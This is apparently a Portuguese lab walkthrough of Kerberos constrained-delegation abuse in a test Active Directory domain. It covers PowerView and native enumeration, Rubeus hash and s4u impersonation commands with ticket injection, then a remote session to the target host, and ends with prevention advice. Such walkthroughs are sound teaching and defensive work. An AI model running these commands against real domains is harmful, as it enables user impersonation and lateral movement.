## Configuracao com Protocol Transition 
<img width="936" height="848" alt="" src="https://github.com/user-attachments/assets/577b7c01-6fc9-4416-bbea-91a933d1a683" />

## Configuracao sem Protocol Transition 
  <img width="955" height="857" alt="" src="https://github.com/user-attachments/assets/0ce8f95f-b4b0-4e97-b685-1b81cbe98080" />

## Procurar delegacoes
- windows
<img width="735" height="630" alt="win" src="https://github.com/user-attachments/assets/f1ec9d02-d4b1-42a0-bdce-ff9dc81822b5" />

- linux
<img width="1035" height="243" alt="li" src="https://github.com/user-attachments/assets/29774bd0-ac10-42fb-8ddf-30f5d792cb88" />

## Com Protocol Transition PoC
<img width="1918" height="620" alt="poc-impacket" src="https://github.com/user-attachments/assets/58001aa8-2ead-4620-8697-b6df5cc215be" />

## Sem Protocol Transition 
Depois de desativar a Transição de Protocolo, o ataque direto falhará. A razão é que, sem essa opção, o ticket que fcastle obtém para si mesmo em nome de outro usuário (via S4U2Self) não é “encaminhável”. Como não pode ser reencaminhado, a etapa S4U2Proxy não funciona. É como se o DC dissesse: “Sei que você diz que o Administrador se conectou a você, mas como não foi com Kerberos, não vou deixar você usar essa identidade para se conectar a outro lugar”.
<img width="1917" height="243" alt="noforward" src="https://github.com/user-attachments/assets/e288d731-0cae-4850-9bfa-75cd0013531f" />
Você precisa de uma estratégia diferente. A mais comum é usar um ataque de Delegação Baseada em Recursos Restritos (Resource-Based Constrained Delegation).


---

## Windows
- Enumeracao com Powerview
```Get-NetUser -TrustedToAuth```
- Sem Powerview (nativo)
```Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo```
<img width="908" height="708" alt="wind-find-del" src="https://github.com/user-attachments/assets/fe23cabb-ddc1-4f92-a4ee-650df36ab0ed" />



```Rubeus.exe hash /password:MYpassword#```
<img width="1058" height="439" alt="hash-pass" src="https://github.com/user-attachments/assets/a1cf4c8b-4c6a-4a53-b155-d777ba9a69b0" />

```.\Rubeus.exe s4u /user:fcastle /rc4:1D113F07D3425C43D4E35770BC773A95 /domain:MARVEL.local /impersonateuser:pparker /msdsspn:"cifs/SPIDERMAN" /dc:HYDRA-DC.MARVEL.local /ptt```

```klist```
<img width="1140" height="403" alt="klistspiderman" src="https://github.com/user-attachments/assets/0548ebd5-f5dd-4d99-bde5-50c1884c36e1" />

```Enter-PSSession SPIDERMAN```   
como meu usuario nao tem permisos privilegiados so posso listar recursos que tem acceso
<img width="1008" height="312" alt="dir" src="https://github.com/user-attachments/assets/cda21e4d-bf6a-428d-81fc-22429e7bee37" />



## Prevencao
- Configure a propriedade A conta é confidencial e não pode ser delegada para todos os usuários privilegiados.
- Adicione usuários privilegiados ao grupo Usuários protegidos: essa associação aplica automaticamente a proteção mencionada acima (no entanto, não é recomendável usar Usuários protegidos sem primeiro entender suas possíveis implicações).
